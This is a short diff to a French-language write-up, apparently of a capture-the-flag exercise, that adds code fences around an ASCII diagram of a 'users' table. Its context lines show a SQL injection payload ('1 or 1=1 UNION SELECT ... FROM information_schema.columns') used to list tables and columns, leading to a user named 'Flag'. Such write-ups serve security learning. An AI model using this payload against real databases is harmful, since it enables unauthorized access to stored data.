@@ -14,6 +14,7 @@ pour connaitre tous les users ainsi que le nom des tables et des colonnes:
 1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 On peut faire un schéma de la table users:
+```
 |¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|
 |   users table    |
 |------------------|
@@ -26,7 +27,7 @@ On peut faire un schéma de la table users:
 | Commentaire      |
 | countersign      |
 |__________________|
-
+```
 Un utilisateur semble être interessant:
 ```
 First name: Flag
